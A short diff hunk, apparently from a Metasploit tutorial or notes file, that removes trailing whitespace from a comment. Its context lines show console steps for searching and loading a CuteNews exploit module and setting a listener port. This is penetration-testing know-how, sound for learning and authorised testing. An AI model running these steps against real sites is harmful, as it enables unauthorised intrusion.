@@ -32,7 +32,7 @@ msfconsole
 msf5 > searchsploit cutenews
 msf5 > use php/webapps/46698.rb
 
-# show you the available parameters for an exploit if used when the command line is in exploit context. 
+# show you the available parameters for an exploit if used when the command line is in exploit context.
 msf > show options
 
 msf5 exploit(php/webapps/46698) > set lport 4444
